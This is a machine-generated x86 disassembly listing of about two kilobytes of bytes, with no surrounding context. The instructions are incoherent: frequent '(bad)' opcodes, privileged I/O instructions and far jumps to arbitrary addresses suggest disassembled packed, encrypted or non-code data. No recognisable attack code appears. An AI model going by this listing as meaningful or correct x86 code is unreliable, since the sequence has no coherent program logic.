  4185f9:	shl    DWORD PTR ds:0x8d574bc7,1
  4185ff:	add    eax,0x797a2588
  418604:	sbb    al,0x80
  418606:	ins    DWORD PTR es:[edi],dx
  418607:	inc    edi
  418608:	mov    ds:0x5041fc24,al
  41860d:	aaa    
  41860e:	mov    al,0x4
  418610:	xchg   ah,ah
  418612:	test   DWORD PTR [ebp-0x3c593fe6],esi
  418618:	mov    bh,0xd
  41861a:	(bad)  
  41861b:	xchg   edi,eax
  41861c:	mov    BYTE PTR [ecx],cl
  41861e:	ins    BYTE PTR es:[edi],dx
  41861f:	inc    ecx
  418620:	pop    edx
  418621:	pusha  
  418622:	es aam 0x8e
  418625:	dec    eax
  418626:	imul   edi,DWORD PTR [edx],0x48032d01
  41862c:	and    bl,0x99
  41862f:	sbb    edi,eax
  418631:	jle    0x418615
  418633:	jl     0x418699
  418635:	cmc    
  418636:	fistp  WORD PTR [esi+0x43]
  418639:	aaa    
  41863a:	pop    ds
  41863b:	xor    ecx,ebp
  41863d:	cwde   
  41863e:	jl     0x41868f
  418640:	mov    eax,ds:0xdb5f3013
  418645:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418646:	stos   DWORD PTR es:[edi],eax
  418647:	jle    0x41867c
  418649:	add    dh,dh
  41864b:	lods   al,BYTE PTR ds:[esi]
  41864c:	pop    eax
  41864d:	sbb    cl,dh
  41864f:	and    eax,0x431d3388
  418654:	xchg   edi,eax
  418655:	sbb    al,0xa2
  418657:	jnp    0x418664
  418659:	add    esp,DWORD PTR [ebp+eiz*4-0x49f59353]
  418660:	jmp    0xaf50a5e2
  418665:	ins    BYTE PTR es:[edi],dx
  418666:	push   ebx
  418667:	xchg   esi,eax
  418668:	xor    dl,BYTE PTR [esi]
  41866a:	cli    
  41866b:	(bad)  
  41866c:	inc    ebp
  41866d:	scas   eax,DWORD PTR es:[edi]
  41866e:	add    eax,0xd5ec2de0
  418673:	cmc    
  418674:	mov    ah,0x7f
  418676:	ins    BYTE PTR es:[edi],dx
  418677:	rcl    DWORD PTR [edx],cl
  418679:	sub    DWORD PTR [ebx+0x64],ebp
  41867c:	dec    ecx
  41867d:	mov    dl,0x17
  41867f:	xor    edi,esp
  418681:	add    ah,al
  418683:	push   ecx
  418684:	mov    dl,0x3d
  418686:	out    0x91,al
  418688:	push   eax
  418689:	frstor [eax-0x45]
  41868c:	dec    ebx
  41868d:	imul   esp,DWORD PTR [edx],0x4b4ade70
  418693:	aad    0x1d
  418695:	leave  
  418696:	bound  esp,QWORD PTR [ecx+0x69364486]
  41869c:	mov    bh,ch
  41869e:	jb     0x41871a
  4186a0:	push   cs
  4186a1:	(bad)  
  4186a2:	(bad)  
  4186a3:	faddp  st(0),st
  4186a5:	add    eax,0x9b42e606
  4186aa:	je     0x4186ac
  4186ac:	mov    al,ds:0x373d1e42
  4186b1:	dec    ebp
  4186b2:	or     BYTE PTR [eax-0x70],cl
  4186b5:	sti    
  4186b6:	push   eax
  4186b7:	aad    0x24
  4186b9:	imul   edx,DWORD PTR [ebp+0x2],0x78
  4186bd:	hlt    
  4186be:	cmp    BYTE PTR [eax],0x95
  4186c1:	test   eax,0x25a53b9
  4186c6:	test   eax,0xae054cec
  4186cb:	aam    0xb3
  4186cd:	fbld   TBYTE PTR [edi-0x42edfa70]
  4186d3:	push   ss
  4186d4:	sbb    dh,ch
  4186d6:	xor    dl,BYTE PTR [ebp+0x644b1b13]
  4186dc:	mov    DWORD PTR [ecx],esp
  4186de:	mov    esp,DWORD PTR [edx-0x2a57562c]
  4186e4:	inc    esi
  4186e5:	pop    ss
  4186e6:	xor    eax,0x4fee6bff
  4186eb:	pop    esp
  4186ec:	xchg   BYTE PTR ds:0xf487ddaf,ah
  4186f2:	jg     0x4186f1
  4186f4:	ret    0x69aa
  4186f7:	mov    edx,0x24345848
  4186fc:	mov    BYTE PTR [esi-0x48],al
  4186ff:	jno    0x4186db
  418701:	frstor [eax-0x11]
  418704:	adc    BYTE PTR [edi+0x3bbabe30],ch
  41870a:	nop
  41870b:	mov    al,0xfe
  41870d:	push   ecx
  41870e:	test   eax,0x6d4e87d6
  418713:	sub    BYTE PTR [eax-0x741aeb66],0x43
  41871a:	mov    al,0xd0
  41871c:	imul   BYTE PTR [ebx+0x47]
  41871f:	adc    DWORD PTR [ecx+0x39],0xffffffad
  418723:	into   
  418724:	and    bl,BYTE PTR ds:0x29e6a976
  41872a:	add    BYTE PTR [ecx],0x61
  41872d:	fidivr WORD PTR [esi-0x73]
  418730:	jne    0x418785
  418732:	sub    al,0x6d
  418734:	test   BYTE PTR [edx-0x6f],ah
  418737:	mov    ebx,0x57370c8
  41873c:	dec    ecx
  41873d:	mov    esp,0x2ae2090
  418742:	pop    ds
  418743:	sar    DWORD PTR [edi-0x221c4884],1
  418749:	jns    0x4187b9
  41874b:	pop    esi
  41874c:	add    BYTE PTR [eax+ebx*1],bl
  41874f:	xlat   BYTE PTR ds:[ebx]
  418750:	outs   dx,DWORD PTR ds:[esi]
  418751:	int    0x2c
  418753:	adc    bh,BYTE PTR [ebx]
  418755:	lock stos DWORD PTR es:[edi],eax
  418757:	mov    eax,0xec6ed589
  41875c:	adc    al,0x49
  41875e:	add    DWORD PTR [edi],0x96620203
  418764:	scas   eax,DWORD PTR es:[edi]
  418765:	and    DWORD PTR [edi+0x1a],edx
  418768:	adc    esp,DWORD PTR [esi+0x1f]
  41876b:	jno    0x4187ad
  41876d:	mov    eax,ds:0x1e9226f3
  418772:	stos   BYTE PTR es:[edi],al
  418773:	shl    BYTE PTR [edi-0x5f],1
  418776:	cld    
  418777:	dec    esi
  418778:	or     al,0xe
  41877a:	and    BYTE PTR [ecx+0x2d1f5fb8],cl
  418780:	cmp    eax,0x3cbacb43
  418785:	retf   0xab91
  418788:	adc    DWORD PTR [ebx-0x67e1a566],0x131350df
  418792:	lahf   
  418793:	adc    al,0x2b
  418795:	fldenv [eax-0x75]
  418798:	lods   eax,DWORD PTR ds:[esi]
  418799:	xor    ebp,edi
  41879b:	mov    esi,0xb8fd10a0
  4187a0:	sub    al,0xb3
  4187a2:	std    
  4187a3:	fisttp QWORD PTR [ecx-0x12515c71]
  4187a9:	cmp    al,0x1e
  4187ab:	jns    0x4187fa
  4187ad:	daa    
  4187ae:	dec    ebp
  4187af:	xor    BYTE PTR [ebx-0x7d],ah
  4187b2:	(bad)  
  4187b3:	cmp    eax,0x699fb240
  4187b8:	xlat   BYTE PTR ds:[ebx]
  4187b9:	mov    ?,ebx
  4187bb:	add    esi,DWORD PTR [edi-0x7727fe3f]
  4187c1:	daa    
  4187c2:	add    eax,0x54e4c8ad
  4187c7:	xor    eax,0xd7354bfa
  4187cc:	enter  0x56b5,0xb7
  4187d0:	ds xchg edi,eax
  4187d2:	js     0x4187a8
  4187d4:	ret    
  4187d5:	test   DWORD PTR [ebp-0x4b],0xd3fef23
  4187dc:	mov    cl,al
  4187de:	xchg   BYTE PTR [ebx+ecx*2],dh
  4187e1:	inc    esp
  4187e2:	mov    ecx,0x16021934
  4187e7:	jo     0x4187e8
  4187e9:	icebp  
  4187ea:	push   esp
  4187eb:	fist   DWORD PTR [ebx-0x6b]
  4187ee:	sbb    bl,BYTE PTR [eax-0x78]
  4187f1:	stc    
  4187f2:	pop    edi
  4187f3:	xor    BYTE PTR ds:0x27567867,ah
  4187f9:	add    esi,DWORD PTR [esi+0x7587e36]
  4187ff:	call   0xdaa1:0xf59c7ff
  418806:	loop   0x418869
  418808:	out    dx,al
  418809:	scas   al,BYTE PTR es:[edi]
  41880a:	adc    eax,0x3aed28d1
  41880f:	aam    0x4d
  418811:	push   eax
  418812:	out    0xa9,al
  418814:	hlt    
  418815:	and    bl,BYTE PTR [ebx]
  418817:	or     DWORD PTR [ebx-0x74e35ea7],0x20
  41881e:	dec    edi
  41881f:	inc    edx
  418820:	js     0x4187d3
  418822:	mov    cl,0xd4
  418824:	mov    esi,0xea62fd7d
  418829:	sbb    bh,BYTE PTR [ebx+ebx*8-0x73]
  41882d:	ror    DWORD PTR [edx+0x289d191a],1
  418833:	pop    ss
  418834:	mov    BYTE PTR [ecx],0xaa
  418837:	mov    ebx,0x3490b2c8
  41883c:	or     ecx,DWORD PTR [eax+ebp*4]
  41883f:	loope  0x4187d3
  418841:	mov    ds:0x4989dc1a,al
  418846:	(bad)  
  418847:	jns    0x418849
  418849:	les    eax,FWORD PTR [esi]
  41884b:	outs   dx,DWORD PTR ds:[esi]
  41884c:	mov    eax,DWORD PTR ds:0x92b3bf2e
  418852:	or     dh,BYTE PTR [ecx+0x68]
  418855:	pop    es
  418856:	pop    ds
  418857:	push   ebp
  418858:	cmp    BYTE PTR ds:0x24384710,al
  41885e:	(bad)  
  418860:	les    ebx,FWORD PTR [esi]
  418862:	scas   eax,DWORD PTR es:[edi]
  418863:	int    0xde
  418865:	sub    eax,ebp
  418867:	push   esi
  418868:	mov    BYTE PTR [edi-0x517fff2f],cl
  41886e:	xchg   ebx,eax
  41886f:	sahf   
  418870:	dec    edx
  418871:	icebp  
  418872:	mov    ecx,0xc63a5bd4
  418877:	push   esp
  418878:	leave  
  418879:	mov    eax,0x1968ac5
  41887e:	jmp    0x4a447b45
  418883:	bound  eax,QWORD PTR [eax+0x7dd57a7b]
  418889:	clc    
  41888a:	pop    ecx
  41888b:	adc    cx,0x30
  41888f:	hlt    
  418890:	jae    0x41889e
  418892:	pop    ds
  418893:	mov    ebx,0x4d0f093d
  418898:	int3   
  418899:	jns    0x4188db
  41889b:	aam    0x7c
  41889d:	adc    eax,DWORD PTR [esi+0x1980558]
  4188a3:	inc    ecx
  4188a4:	mov    DWORD PTR [ebx+0x5f],esi
  4188a7:	dec    edi
  4188a8:	cmp    DWORD PTR [esi+eiz*2-0x17],esp
  4188ac:	retf   0x19f9
  4188af:	shr    DWORD PTR [edi+0x32bb4d65],1
  4188b5:	pop    ss
  4188b6:	clc    
  4188b7:	retf   
  4188b8:	fldcw  WORD PTR [edx-0x777419]
  4188be:	or     al,0x6b
  4188c0:	and    al,0x7d
  4188c2:	ss jmp 0x8335:0xb89448e4
  4188ca:	pop    ecx
  4188cb:	pop    eax
  4188cc:	aas    
  4188cd:	fwait
  4188ce:	loop   0x41886d
  4188d0:	cmp    BYTE PTR [ecx+0x34],0xf4
  4188d4:	add    BYTE PTR [ebp-0x6bf937e1],0x20
  4188db:	aam    0xfd
  4188dd:	sbb    ch,BYTE PTR [edx+0x569e6724]
  4188e3:	ins    BYTE PTR es:[edi],dx
  4188e4:	ins    DWORD PTR es:[edi],dx
  4188e5:	test   DWORD PTR [edi],ebx
  4188e7:	stos   DWORD PTR es:[edi],eax
  4188e8:	xchg   ebp,eax
  4188e9:	and    esp,eax
  4188eb:	inc    edi
  4188ec:	ror    BYTE PTR [edi+ebx*4],cl
  4188ef:	aam    0xc6
  4188f1:	jmp    0x67f8a34a
  4188f6:	adc    al,0x25
  4188f8:	inc    ecx
  4188f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4188fa:	pusha  
  4188fb:	iret   
  4188fc:	sub    dl,BYTE PTR ds:0xc5573dd
  418902:	sbb    ebx,DWORD PTR [ecx-0x3d]
  418905:	jb     0x418925
  418907:	jg     0x4188a6
  418909:	mov    bl,0x55
  41890b:	test   bh,ah
  41890d:	fbld   TBYTE PTR [ecx-0x3b]
  418910:	inc    eax
  418911:	mov    dh,0xf1
  418913:	(bad)  
  418914:	out    dx,al
  418915:	loop   0x4188ef
  418917:	pushf  
  418918:	jge    0x418962
  41891a:	stos   BYTE PTR es:[edi],al
  41891b:	pop    es
  41891c:	iret   
  41891d:	sbb    bl,0x49
  418920:	popf   
  418921:	test   BYTE PTR [ebx-0x5b16776f],dl
  418927:	shl    DWORD PTR [edx-0x710d72b9],cl
  41892d:	and    al,0x20
  41892f:	push   edx
  418930:	retf   
  418931:	iret   
  418932:	mov    eax,ds:0x6e9de049
  418937:	xor    eax,0x611f2232
  41893c:	jbe    0x418982
  41893e:	and    cl,dh
  418940:	xchg   esi,eax
  418941:	mov    ebx,0x726bd5ea
  418946:	pop    esi
  418947:	(bad)  
  418948:	scas   eax,DWORD PTR es:[edi]
  418949:	sub    al,0xd3
  41894b:	or     cl,BYTE PTR [edi-0x67635b07]
  418951:	mov    eax,fs
  418953:	inc    ebp
  418954:	jo     0x418936
  418956:	outs   dx,DWORD PTR ds:[esi]
  418957:	aad    0x3b
  418959:	adc    al,0xe3
  41895b:	push   edx
  41895c:	dec    esp
  41895d:	retf   0x2bae
  418960:	xchg   esp,eax
  418961:	sub    eax,0x5d8d089f
  418966:	stc    
  418967:	and    ecx,DWORD PTR [ecx+0x50592d3a]
  41896d:	add    ah,dl
  41896f:	add    eax,0x6ca4d367
  418974:	xchg   ebp,eax
  418975:	push   ebx
  418976:	pop    ds
  418977:	(bad)  
  418978:	je     0x418964
  41897a:	sbb    ch,bh
  41897c:	xchg   DWORD PTR [edi+0xf2c75e9],ebx
  418982:	aaa    
  418983:	loope  0x41893b
  418985:	and    BYTE PTR [edi],bl
  418987:	add    edi,edi
  418989:	mov    ebp,0x37104a2f
  41898e:	(bad)  
  41898f:	fsub   st(5),st
  418991:	add    esp,DWORD PTR [edx]
  418993:	fnstcw WORD PTR [esi-0x68]
  418996:	ins    BYTE PTR es:[edi],dx
  418997:	jne    0x418920
  418999:	test   DWORD PTR [esi+0x43d7b484],eax
  41899f:	fmul   DWORD PTR [ecx]
  4189a1:	inc    ebx
  4189a2:	loop   0x4189e9
  4189a4:	(bad)  
  4189a5:	fld    st(1)
  4189a7:	retf   0x71d4
  4189aa:	xchg   BYTE PTR [esi-0x78],bl
  4189ad:	mov    ch,0xbe
  4189af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4189b1:	jg     0x418a00
  4189b3:	inc    edx
  4189b4:	xchg   esi,eax
  4189b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4189b6:	xor    edi,esp
  4189b8:	adc    al,0x8b
  4189ba:	loop   0x4189e2
  4189bc:	fsub   QWORD PTR [ebx-0x3a9fbe34]
  4189c2:	and    al,0xa2
  4189c4:	inc    eax
  4189c5:	arpl   bx,bx
  4189c7:	clc    
  4189c8:	mov    BYTE PTR [edi],ch
  4189ca:	stc    
  4189cb:	sti    
  4189cc:	pushf  
  4189cd:	jmp    0x1e7f:0x5c19117d
  4189d4:	push   ebp
  4189d5:	jecxz  0x4189f6
  4189d7:	pop    ebx
  4189d8:	mov    dh,0x20
  4189da:	mov    ah,0xda
  4189dc:	mov    ah,0x5
  4189de:	sub    BYTE PTR [edi+0x3b],bl
  4189e1:	or     DWORD PTR [esi+edi*8],edi
  4189e4:	mov    bh,0xc3
  4189e6:	pop    ds
  4189e7:	jne    0x418a0c
  4189e9:	mov    BYTE PTR [edx],ah
  4189eb:	leave  
  4189ec:	add    esp,esi
  4189ee:	cld    
  4189ef:	fadd   QWORD PTR [ecx+0x3]
  4189f2:	dec    esi
  4189f3:	xchg   ecx,eax
  4189f4:	pop    esi
  4189f5:	into   
  4189f6:	repz test eax,0x5f6dc30a
  4189fc:	or     edx,0x65
  4189ff:	sbb    ebp,DWORD PTR [eax+0x65]
  418a02:	cdq    
  418a03:	xor    eax,0x258e44bf
  418a08:	ins    DWORD PTR es:[edi],dx
  418a09:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418a0a:	cmp    al,0xa3
  418a0c:	mov    BYTE PTR ds:0x6a2cfd7f,ah
  418a12:	popa   
  418a13:	in     eax,0xec
  418a15:	sti    
  418a16:	int    0x22
  418a18:	stos   DWORD PTR es:[edi],eax
  418a19:	pop    es
  418a1a:	adc    BYTE PTR [ebx-0x41],ch
  418a1d:	add    ch,BYTE PTR [edi+ebp*1-0x15]
  418a21:	sub    eax,0xf872aad9
  418a26:	bound  ebx,QWORD PTR [ebp+0x6b]
  418a29:	dec    eax
  418a2a:	rcl    BYTE PTR [ebx+esi*2-0x3d],1
  418a2e:	icebp  
  418a2f:	adc    BYTE PTR [eax],dl
  418a31:	imul   esp,DWORD PTR [edi-0x2c],0x5a
  418a35:	dec    esp
  418a36:	ja     0x418a3a
  418a38:	cmc    
  418a39:	push   es
  418a3a:	dec    ecx
  418a3b:	fwait
  418a3c:	mov    ch,0x25
  418a3e:	fnstenv [ecx]
  418a40:	std    
  418a41:	add    dl,dl
  418a43:	adc    dh,BYTE PTR [edx]
  418a45:	lahf   
  418a46:	rcl    BYTE PTR [edx],cl
  418a48:	inc    eax
  418a49:	add    dl,BYTE PTR [eax]
  418a4b:	hlt    
  418a4c:	push   ds
  418a4d:	or     DWORD PTR [ebx+0x5d],esp
  418a50:	xor    BYTE PTR [ecx+eiz*2+0x4a207881],bl
  418a57:	sub    eax,0x4727c08b
  418a5c:	push   ebx
  418a5d:	add    esi,DWORD PTR [esi+0x61]
  418a60:	pop    edx
  418a61:	leave  
  418a62:	sub    eax,0x6c548f20
  418a67:	sub    edi,DWORD PTR [ebx+edi*8+0x8693ff7]
  418a6e:	xlat   BYTE PTR ds:[ebx]
  418a6f:	xor    eax,0xedcc1b28
  418a74:	mov    ds:0x8ed3c21a,eax
  418a79:	popa   
  418a7a:	ds jns 0x418ad4
  418a7d:	jb     0x418a84
  418a7f:	mov    al,0x89
  418a81:	stc    
  418a82:	gs retf 0xbbb1
  418a86:	mov    edi,0xbb89e657
  418a8b:	out    0x88,eax
  418a8d:	ins    DWORD PTR es:[edi],dx
  418a8e:	rcr    BYTE PTR [esi],cl
  418a90:	test   eax,0x8b2a2749
  418a95:	adc    eax,0x9be87fa0
  418a9a:	outs   dx,BYTE PTR ds:[esi]
  418a9b:	sbb    eax,0xd58251e8
  418aa0:	stos   BYTE PTR es:[edi],al
  418aa1:	fistp  QWORD PTR [edi+0x4b]
  418aa4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418aa5:	cmp    ebx,eax
  418aa7:	aaa    
  418aa8:	mov    ch,0xa5
  418aaa:	sbb    eax,esp
  418aac:	jle    0x418ab1
  418aae:	xchg   esp,eax
  418aaf:	sub    DWORD PTR [edx+0xbce0a30],eax
  418ab5:	and    al,0x50
  418ab7:	inc    esp
  418ab8:	repnz call 0x751e:0xce305a5f
  418ac0:	xchg   ebp,eax
  418ac1:	aad    0x77
  418ac3:	fld    TBYTE PTR [esi]
  418ac5:	add    al,bl
  418ac7:	out    0xf5,eax
  418ac9:	fsub   QWORD PTR [ebx-0x4b]
  418acc:	pusha  
  418acd:	bound  ebx,QWORD PTR [ecx+0x7dabb8d4]
  418ad3:	jns    0x418b4f
  418ad5:	mov    bh,0xfe
  418ad7:	add    al,0x89
  418ad9:	imul   ebp,DWORD PTR [edi-0x1e9dbf3e],0x24
  418ae0:	add    BYTE PTR [edx],al
  418ae2:	(bad)  
  418ae3:	mov    BYTE PTR [esi+0x0],dh
  418ae6:	icebp  
  418ae7:	retf   0x4763
  418aea:	push   ds
  418aeb:	outs   dx,DWORD PTR ds:[esi]
  418aec:	adc    DWORD PTR [ecx+0x4d045315],ebp
  418af2:	mov    edi,0x7542b5a6
  418af7:	int3   
  418af8:	xor    DWORD PTR [eax+0x1e],edx
  418afb:	inc    ebx
  418afc:	push   cs
  418afd:	leave  
  418afe:	push   es
  418aff:	xchg   ebx,eax
  418b00:	mov    WORD PTR [esi],fs
  418b02:	dec    esp
  418b03:	inc    esi
  418b04:	xchg   DWORD PTR [esi],edx
  418b06:	mov    esp,0xba3ec87f
  418b0b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418b0c:	pop    ss
  418b0d:	mov    cl,0x1f
  418b0f:	adc    DWORD PTR [esi-0x73],ebp
  418b12:	or     BYTE PTR [esi+edi*4-0x77],0x8c
  418b17:	stos   BYTE PTR es:[edi],al
  418b18:	and    DWORD PTR [ebp+0x406315ad],esp
  418b1e:	cmp    esi,ebp
  418b20:	scas   eax,DWORD PTR es:[edi]
  418b21:	mov    ebp,0x159b7f2c
  418b26:	in     al,0xdf
  418b28:	mov    al,0x2
  418b2a:	mov    bh,BYTE PTR gs:[ebx-0x1e3a314a]
  418b31:	sub    DWORD PTR [esi+esi*1-0x4c],edx
  418b35:	test   bh,bl
  418b37:	dec    eax
  418b38:	or     al,0xa6
  418b3a:	daa    
  418b3b:	inc    esp
  418b3c:	jo     0x418b00
  418b3e:	pop    esp
  418b3f:	ror    DWORD PTR [edx+0x4b5a1fd6],1
  418b45:	stos   BYTE PTR es:[edi],al
  418b46:	aad    0xff
  418b48:	inc    eax
  418b49:	or     esi,DWORD PTR [edi]
  418b4b:	aam    0x15
  418b4d:	out    0xc1,eax
  418b4f:	mov    edx,0xb46c6543
  418b54:	mov    bh,ch
  418b56:	out    dx,eax
  418b57:	scas   eax,DWORD PTR es:[edi]
  418b58:	repnz xor eax,0x2aa168d
  418b5e:	mov    gs,WORD PTR [eax+0x0]
  418b61:	mov    esi,0x8dcef4b4
  418b66:	pop    ds
  418b67:	xlat   BYTE PTR ds:[ebx]
  418b68:	sbb    esi,0x4fb97028
  418b6e:	loopne 0x418af4
  418b70:	add    DWORD PTR [edx],0xebef0082
  418b76:	shl    esi,cl
  418b78:	call   0x88f99b75
  418b7d:	mov    ebx,0xe39a1dc5
  418b82:	out    0xe,al
  418b84:	push   esi
  418b85:	xchg   BYTE PTR [ebx-0x3d],cl
  418b88:	mov    DWORD PTR [edx-0x528285d],eax
  418b8e:	outs   dx,BYTE PTR ds:[esi]
  418b8f:	out    dx,al
  418b90:	mov    bh,0xb
  418b92:	or     BYTE PTR [edx+eax*1-0x4],0x50
  418b97:	jo     0x418b21
  418b99:	inc    esp
  418b9a:	inc    eax
  418b9b:	shl    DWORD PTR [ebx+eax*1-0x5e],1
  418b9f:	sti    
  418ba0:	jg     0x418b7f
  418ba2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418ba3:	mov    eax,fs
  418ba5:	outs   dx,DWORD PTR ds:[esi]
  418ba6:	ja     0x418b51
  418ba8:	div    bh
  418baa:	cs stos DWORD PTR es:[edi],eax
  418bac:	jnp    0x418bb0
  418bae:	push   0xd5db7c01
  418bb3:	dec    esi
  418bb4:	mov    eax,0x49631e69
  418bb9:	enter  0xf616,0x7a
  418bbd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418bbe:	jmp    0x42bc3f98
  418bc3:	adc    DWORD PTR [edi+0x7d3240b2],esi
  418bc9:	test   DWORD PTR [ebx+0x57],edi
  418bcc:	inc    esp
  418bcd:	pop    ds
  418bce:	push   esp
  418bcf:	push   ebp
  418bd0:	stc    
  418bd1:	xchg   edx,eax
  418bd2:	icebp  
  418bd3:	pop    ss
  418bd4:	lar    edx,WORD PTR [eax+ecx*1+0x4f71f694]
  418bdc:	lea    ecx,[edx-0x349122a3]
  418be2:	pop    ds
  418be3:	adc    al,0x18
  418be5:	xchg   esi,eax
  418be6:	xchg   ecx,eax
  418be7:	mov    dh,0xcc
  418be9:	add    dh,BYTE PTR [eax+0x6a97cb29]
  418bef:	mov    BYTE PTR [edi+0x29],0x1f
  418bf3:	mov    eax,ds:0x354b559f
  418bf8:	dec    esp
  418bf9:	rcr    DWORD PTR [ebp-0x2b],0xdd
  418bfd:	add    dl,BYTE PTR [edi]
  418bff:	jg     0x418be8
  418c01:	jnp    0x418c39
  418c03:	imul   ecx,DWORD PTR [eax+0x7ff343f9],0xffffffc5
  418c0a:	xor    esi,DWORD PTR ds:0x1c0800f1
  418c10:	pusha  
  418c11:	test   BYTE PTR [edx+0x75],dl
  418c14:	mov    dl,0xda
  418c16:	jo     0x418bea
  418c18:	xchg   esp,eax
  418c19:	adc    esi,DWORD PTR [edx]
  418c1b:	inc    edx
  418c1c:	cli    
  418c1d:	fdivr  DWORD PTR [ebp+0x7a9309e5]
  418c23:	mov    eax,ds:0xd89ceaae
  418c28:	mov    DWORD PTR [ebx],0xdbabcb60
  418c2e:	jmp    FWORD PTR [ebp+0xe382a4]
  418c34:	adc    ah,BYTE PTR [edi+ebx*1-0x39]
  418c38:	xor    BYTE PTR [eax],bh
  418c3a:	jle    0x418c66
  418c3c:	icebp  
  418c3d:	lods   eax,DWORD PTR ds:[esi]
  418c3e:	pop    ds
  418c3f:	pop    eax
  418c40:	cwde   
  418c41:	dec    edx
  418c42:	push   ds
  418c43:	cli    
  418c44:	jecxz  0x418c9a
  418c46:	fld    QWORD PTR [edx+0x7716a90f]
  418c4c:	push   ss
  418c4d:	or     eax,0x8809cf5a
  418c52:	loopne 0x418c6c
  418c54:	leave  
  418c55:	sub    ah,cl
  418c57:	and    eax,0x17cfac64
  418c5c:	out    dx,eax
  418c5d:	int    0x3c
  418c5f:	mov    ds:0x2a870189,al
  418c64:	ds mov al,0xa3
  418c67:	stc    
  418c68:	push   edx
  418c69:	add    dh,dh
  418c6b:	xor    BYTE PTR [esi+0x5c80f094],ch
  418c71:	sar    BYTE PTR [esi+0x1f],0xa1
  418c75:	push   ss
  418c76:	outs   dx,DWORD PTR ds:[esi]
  418c77:	aam    0x48
  418c79:	imul   esi,DWORD PTR [ebp+ecx*2-0x73],0x6269862c
  418c81:	dec    edx
  418c82:	popa   
  418c83:	std    
  418c84:	mov    esi,0x2b059f61
  418c89:	pop    ecx
  418c8a:	pop    ebp
  418c8b:	repz rcr DWORD PTR [edx-0x26],cl
  418c8f:	sbb    ecx,DWORD PTR [eax]
  418c91:	out    0x70,eax
  418c93:	icebp  
  418c94:	test   al,0x40
  418c96:	push   ecx
  418c97:	aam    0x2
  418c99:	push   edi
  418c9a:	xchg   esi,eax
  418c9b:	pop    ds
  418c9c:	iret   
  418c9d:	inc    DWORD PTR [eax+ebx*1]
  418ca0:	clc    
  418ca1:	pop    esp
  418ca2:	pop    ebp
  418ca3:	stc    
  418ca4:	ffree  st(7)
  418ca6:	popf   
  418ca7:	sahf   
  418ca8:	sar    BYTE PTR [esi+ebx*1+0x7a],1
  418cac:	ret    0xb422
  418caf:	(bad)  
  418cb0:	test   eax,0xe18dfa14
  418cb5:	fimul  DWORD PTR [edi-0x5336d0eb]
  418cbb:	push   esi
  418cbc:	mov    DWORD PTR [ecx+0x439faae1],esi
  418cc2:	push   ds
  418cc3:	and    BYTE PTR [edi],bh
  418cc5:	add    ebx,DWORD PTR [esi+0x2545a797]
  418ccb:	inc    edx
  418ccc:	(bad)  
  418cce:	pusha  
  418ccf:	sub    eax,0x58fef6cc
  418cd4:	repnz mov edi,0x87c811ea
  418cda:	mov    ebp,0x255c8e73
  418cdf:	cs (bad) 
  418ce1:	frstor [eax+0xa]
  418ce4:	mov    edi,0x89ec0c9a
  418ce9:	xchg   ebx,eax
  418cea:	stc    
  418ceb:	sbb    BYTE PTR [ebx-0x1],ch
  418cee:	jl     0x418c9b
  418cf0:	shl    ecx,cl
  418cf2:	ror    ah,1
  418cf4:	imul   eax,DWORD PTR [ebx],0x941350d8
  418cfa:	(bad)  
  418cfb:	lahf   
  418cfc:	fldenv [edi+edi*2+0x50abb178]
  418d03:	cmp    BYTE PTR [eax],cl
  418d05:	or     esp,eax
  418d07:	and    al,0x40
  418d09:	pop    ebx
  418d0a:	adc    edx,edi
  418d0c:	sbb    ebp,esp
  418d0e:	xor    ebp,esp
  418d10:	jo     0x418d53
  418d12:	shl    DWORD PTR [edx],0x8a
  418d15:	mov    ch,0xbb
  418d17:	add    BYTE PTR [esi],cl
  418d19:	push   ebx
  418d1a:	(bad)  
  418d1b:	and    DWORD PTR [eax-0x4d],ebx
  418d1e:	mov    esp,ss
  418d20:	mov    es,edi
  418d22:	push   cs
  418d23:	cwde   
  418d24:	hlt    
  418d25:	nop
  418d26:	add    cl,dl
  418d28:	push   esp
  418d29:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418d2a:	pop    ds
  418d2b:	das    
  418d2c:	sub    edi,DWORD PTR [edi+0xbf6f552]
  418d32:	xlat   BYTE PTR ds:[ebx]
  418d33:	aam    0xa
  418d35:	or     esp,DWORD PTR [ebx+0x5e]
  418d38:	loop   0x418cee
  418d3a:	xor    cl,ch
  418d3c:	mov    BYTE PTR [ecx+0x8],bh
  418d3f:	hlt    
  418d40:	mov    bl,BYTE PTR [esi-0x3e]
  418d43:	lock push ebx
  418d45:	add    ebx,DWORD PTR [esi+0x790782e8]
  418d4b:	xlat   BYTE PTR ds:[ebx]
  418d4c:	push   0xa7ab60e4
  418d51:	push   cs
  418d52:	push   ebx
  418d53:	sbb    al,0x1e
  418d55:	xor    dl,BYTE PTR [eax-0x2b]
  418d58:	std    
  418d59:	jle    0x418d68
  418d5b:	push   eax
  418d5c:	push   edx
  418d5d:	outs   dx,DWORD PTR ds:[esi]
  418d5e:	inc    eax
  418d5f:	adc    cl,BYTE PTR [eax+0x74970b0d]
  418d65:	imul   esp,DWORD PTR [ebp+0x27],0xcd4a0dc5
  418d6c:	loop   0x418d71
  418d6e:	and    ch,BYTE PTR [eax]
  418d70:	or     DWORD PTR [ebp+ebp*4-0x37],edx
  418d74:	in     al,dx
  418d75:	std    
  418d76:	mov    esp,0x13b88d7
  418d7b:	repnz inc edx
  418d7d:	sahf   
  418d7e:	sbb    al,0x8a
  418d80:	fldcw  WORD PTR [esp+ecx*2]
  418d83:	cld    
  418d84:	sub    DWORD PTR [ebp+eiz*2-0x6084de68],ebp
  418d8b:	jp     0x418d85
  418d8d:	fcomp  DWORD PTR [edi]
  418d8f:	aas    
  418d90:	mov    ch,0x5b
  418d92:	jno    0x418db1
  418d94:	scas   al,BYTE PTR es:[edi]
  418d95:	and    DWORD PTR [ecx],ecx
  418d97:	je     0x418dfb
  418d99:	add    edi,DWORD PTR [esi]
  418d9b:	fmul   QWORD PTR [esi+eiz*1]
  418d9e:	xchg   BYTE PTR [edx+0x7a],bl
  418da1:	jno    0x418dc1
